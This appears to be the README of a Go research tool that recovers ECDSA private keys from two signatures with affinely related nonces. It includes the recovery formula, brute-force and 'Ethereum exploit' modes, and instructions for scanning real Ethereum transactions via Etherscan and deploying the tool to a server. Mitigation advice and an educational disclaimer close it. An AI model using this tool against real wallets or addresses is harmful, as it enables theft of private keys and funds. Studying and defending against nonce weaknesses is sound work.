# ECDSA Key Recovery from Affinely Related Nonces

A research-oriented Go implementation demonstrating the vulnerability of ECDSA when nonces exhibit affine relationships. This project implements the attack described in the paper "Breaking ECDSA with Two Affinely Related Nonces" by Gilchrist, Buchanan, and Finlow-Bates (2025).

## 📋 Table of Contents

- [Research Background](#research-background)
- [Theoretical Foundation](#theoretical-foundation)
- [Installation](#installation)
- [Usage](#usage)
- [Architecture](#architecture)
- [Technical Implementation](#technical-implementation)
- [Real-World Applications](#real-world-applications)
- [Building & Deployment](#building--deployment)
- [References](#references)

## Research Background

The Elliptic Curve Digital Signature Algorithm (ECDSA) is fundamental to modern cryptography, securing Bitcoin, Ethereum, and numerous other blockchain and security protocols. The security of ECDSA critically depends on the **uniqueness and randomness** of the nonce (number used once) used in each signature.

### The Vulnerability

This project demonstrates that when two nonces share an **affine relationship** of the form:

```
k₂ = a·k₁ + b  (mod n)
```

where `k₁` and `k₂` are nonces, `a` and `b` are known integers, and `n` is the elliptic curve order, the **private key can be recovered from just two signatures**.

### Research Significance

This vulnerability has practical implications:

- **Counter-based nonces**: When nonces follow a counter pattern (`k₂ = k₁ + 1`), keys can be recovered
- **Transaction count misuse**: Some incorrect Ethereum implementations use transaction count as ECDSA nonce, creating the relationship `k₂ = k₁ + 1`
- **Linear patterns**: Any linear relationship between nonces enables key recovery

## Theoretical Foundation

### Mathematical Model

Given two ECDSA signatures `(r₁, s₁)` and `(r₂, s₂)` with message hashes `z₁` and `z₂`, and nonces related by `k₂ = a·k₁ + b (mod n)`, the private key `d` can be recovered using:

```
numerator = (a·s₂·z₁ - s₁·z₂ + b·s₁·s₂) mod n
denominator = (r₂·s₁ - a·r₁·s₂) mod n
d = (numerator · denominator⁻¹) mod n
```

**Conditions for recovery:**
- `denominator ≠ 0 (mod n)`
- Both signatures must be valid
- The affine relationship must hold

### Proof Sketch

The recovery formula is derived from the ECDSA signature equations:

```
s₁ = k₁⁻¹ · (z₁ + r₁·d) mod n
s₂ = k₂⁻¹ · (z₂ + r₂·d) mod n
```

Substituting `k₂ = a·k₁ + b` and solving the system of equations yields the recovery formula.

## Installation

### Prerequisites

- Go 1.21 or higher
- Internet access (for dependencies)

### Quick Start

```bash
# Clone the repository
git clone <repository-url>
cd slippage

# Download dependencies
go mod download

# Run demonstration
go run main.go
```

## Usage

### Command-Line Interface

The project provides multiple modes for different scenarios:

#### Demo Mode (Default)
```bash
go run main.go
# or
go run main.go demo
```
Demonstrates the attack with generated data using multi-threaded processing.

#### Batch Testing
```bash
go run main.go batch [count]
```
Runs multiple test cases in parallel for statistical analysis.

#### Known Nonce Pattern
```bash
go run main.go known
```
Recovers keys when the nonce generation pattern is known (e.g., counter, linear).

#### Brute-Force Search
```bash
go run main.go bruteforce
```
Searches for affine relationships when the pattern is unknown.

#### Ethereum Exploit
```bash
go run main.go ethereum
```
Demonstrates the real-world vulnerability when transaction count is used as ECDSA nonce.

### Real Transaction Analysis

For analyzing real Ethereum transactions:

```bash
# Using Etherscan API
go run main1.go data.json --etherscan YOUR_API_KEY

# Using local JSON files
go run main1.go example_data.json example_transactions.json

# With brute-force search parameters
go run examples/real_transaction_example.go \
  --data example_data.json \
  --tx transactions.json \
  --minA 1 --maxA 1000 \
  --minB 1 --maxB 1000 \
  --workers 8
```

## Architecture

### Project Structure

```
breaking-ecdsa/
├── config/          # Configuration management
├── generator/       # Key and signature generation
├── solver/          # Private key recovery algorithms
├── pattern/         # Nonce pattern detection and brute-force
├── ethereum/        # Ethereum-specific implementations
│   ├── ethereum.go  # Address simulation and extraction
│   ├── etherscan.go # Etherscan API integration
│   └── utils.go     # Utility functions
├── worker/          # Parallel processing worker pool
├── examples/         # Example implementations
│   ├── advanced_example.go
│   ├── known_nonce_example.go
│   ├── ethereum_exploit_example.go
│   └── real_transaction_example.go
├── main.go          # Main entry point
└── main1.go         # Etherscan integration entry point
```

### Core Components

#### `solver`
Implements the mathematical recovery formula from the research paper:
- Formula validation
- Key recovery computation
- Result verification

#### `pattern`
Nonce pattern analysis:
- Known pattern detection (counter, linear, affine)
- Brute-force affine relationship search
- Pattern-based key recovery

#### `generator`
Test data generation:
- ECDSA key pair generation
- Affine relationship nonce generation
- Signature creation with specified nonces

#### `ethereum`
Real-world Ethereum analysis:
- Transaction signature extraction
- Etherscan API integration
- Counter nonce vulnerability demonstration

## Technical Implementation

### Code Example: Known Affine Relationship

```go
import (
    "math/big"
    "breaking-ecdsa/config"
    "breaking-ecdsa/generator"
    "breaking-ecdsa/solver"
)

// Configure affine relationship: k₂ = 2·k₁ + 3
cfg := config.DefaultConfig()
cfg.AffineRelationship.A = big.NewInt(2)
cfg.AffineRelationship.B = big.NewInt(3)

// Generate test data
data, err := generator.GenerateSampleData(cfg)
if err != nil {
    log.Fatal(err)
}

// Recover private key
solver := solver.NewSolver(cfg.Curve)
recoveredKey, err := solver.Solve(data)
if err != nil {
    log.Fatal(err)
}

// Verify recovery
if recoveredKey.Cmp(data.KeyPair.PrivateKey) == 0 {
    fmt.Println("✓ Key successfully recovered")
}
```

### Code Example: Brute-Force Search

```go
import "breaking-ecdsa/pattern"

// Initialize brute-force solver
bfs := pattern.NewBruteForceSolver(curve)
bfs.SetSearchRangeWithMinB(1, 1000, 1, 1000) // minA, maxA, minB, maxB
bfs.SetWorkers(8) // Parallel workers

// Search for affine relationship
results := bfs.BruteForceAffineRelationWithVerification(
    sig1, sig2, msg1, msg2, publicKey,
)

for result := range results {
    if result.Success {
        fmt.Printf("Found: a=%s, b=%s\n", result.A, result.B)
        fmt.Printf("Private key: %s\n", result.PrivateKey)
        break
    }
}
```

### Code Example: Ethereum Counter Nonce

```go
import "breaking-ecdsa/ethereum"

// Create Ethereum address
address, _ := ethereum.NewEthereumAddress(curve)

// Sign two consecutive transactions
tx1, _ := address.SignTransactionWithCounterNonce(to, value1, data1)
tx2, _ := address.SignTransactionWithCounterNonce(to, value2, data2)

// Extract private key (relationship: k₂ = k₁ + 1)
exploit := ethereum.NewEthereumExploit(curve)
recoveredKey, _ := exploit.ExploitFromCounterNonce(tx1, tx2)
```

## Real-World Applications

### Ethereum Transaction Analysis

The project includes tools for analyzing real Ethereum transactions:

#### Input Format

**`example_data.json`:**
```json
{
  "address": "0x98d1405a54261bbb9321f1eb493d94f050985113",
  "public_key": "0438f42fb1aa395edc7346963422211405c72f9701bdae2dcece6b3236f7b968a39d082f717a6edc7f6c50c4eb016666822d020c95c06200dbe7d9157b1ddee937",
  "tx_ids": ["0xa8312a549cdf57ac3364d3fe16bb016a230f1191faa16463a4955d62e20af395"]
}
```

**`transactions.json`:**
```json
[
  {
    "tx_id": "0xa8312a549cdf57ac3364d3fe16bb016a230f1191faa16463a4955d62e20af395",
    "r": "0x1234...",
    "s": "0xabcd...",
    "v": 27,
    "message": "0x9c22ff5f21f0b81b113e63f7db6da94fedef11b2119b4088b89664fb9a3cb658"
  }
]
```

#### Analysis Workflow

1. **Load transaction data** (from API or JSON)
2. **Extract signatures** (r, s, v) and message hashes
3. **Check for counter pattern** (k₂ = k₁ + 1)
4. **If counter pattern fails, brute-force** affine relationships
5. **Verify recovered key** against public key

## Building & Deployment

### Local Development

```bash
# Build for current platform
go build -o slippage main.go

# Run tests
go test ./...
```

### Cross-Platform Build

#### Using Makefile
```bash
# Build for Linux
make build-linux

# Build for Ubuntu (same as Linux)
make build-ubuntu

# Build for all architectures
make build-all
```

#### Using Build Script
```bash
chmod +x build-ubuntu.sh
./build-ubuntu.sh
```

#### Manual Build
```bash
# Linux amd64
GOOS=linux GOARCH=amd64 go build -ldflags "-s -w" \
  -o real_transaction_example-linux-amd64 \
  examples/real_transaction_example.go

# Linux arm64
GOOS=linux GOARCH=arm64 go build -ldflags "-s -w" \
  -o real_transaction_example-linux-arm64 \
  examples/real_transaction_example.go
```

### Deployment to Ubuntu

```bash
# Transfer binary
scp real_transaction_example-linux-amd64 user@server:/path/

# On server: set permissions and run
chmod +x real_transaction_example-linux-amd64
./real_transaction_example-linux-amd64 --maxA 1000 --maxB 1000
```

## Security Considerations

⚠️ **This tool is for educational and research purposes only.**

### Security Recommendations

1. **Use RFC 6979**: Implement deterministic nonce generation per RFC 6979
2. **Cryptographically secure randomness**: Always use CSPRNG for nonce generation
3. **Never reuse nonces**: Each signature must use a unique nonce
4. **Avoid predictable patterns**: Counter, linear, or any affine patterns are vulnerable
5. **Validate r ≠ 0**: Ensure signature component `r` is never zero

### Known Vulnerabilities

- **Transaction count as nonce**: Using Ethereum transaction count as ECDSA nonce creates `k₂ = k₁ + 1`, enabling key recovery
- **Counter-based nonces**: Any sequential nonce pattern is vulnerable
- **Linear relationships**: Any affine relationship between nonces compromises security

## References

### Primary Research

1. **Gilchrist, J., Buchanan, W. J., & Finlow-Bates, K. (2025)**  
   "Breaking ECDSA with Two Affinely Related Nonces"  
   [arXiv:2504.13737](https://arxiv.org/html/2504.13737v1)

### Standards & Specifications

2. **RFC 6979**: Deterministic Usage of DSA and ECDSA  
   [datatracker.ietf.org/doc/rfc6979/](https://datatracker.ietf.org/doc/rfc6979/)

3. **ECDSA Specification**: FIPS 186-4 Digital Signature Standard  
   [csrc.nist.gov/publications/detail/fips/186/4/final](https://csrc.nist.gov/publications/detail/fips/186/4/final)

### Documentation

4. **Go crypto/ecdsa**: [pkg.go.dev/crypto/ecdsa](https://pkg.go.dev/crypto/ecdsa)

5. **Ethereum Transactions**: [ethereum.org/en/developers/docs/transactions/](https://ethereum.org/en/developers/docs/transactions/)

6. **ECDSA Overview**: [en.wikipedia.org/wiki/Elliptic_Curve_Digital_Signature_Algorithm](https://en.wikipedia.org/wiki/Elliptic_Curve_Digital_Signature_Algorithm)

## License

This project is intended for educational and research purposes. Commercial or malicious use is prohibited.

## Contributing

Contributions are welcome. Please:
1. Open an issue to discuss changes
2. Fork the repository and create a feature branch
3. Submit a pull request with clear documentation

---

**Note**: This implementation serves to demonstrate ECDSA vulnerabilities and emphasizes the critical importance of proper nonce generation in cryptographic systems.
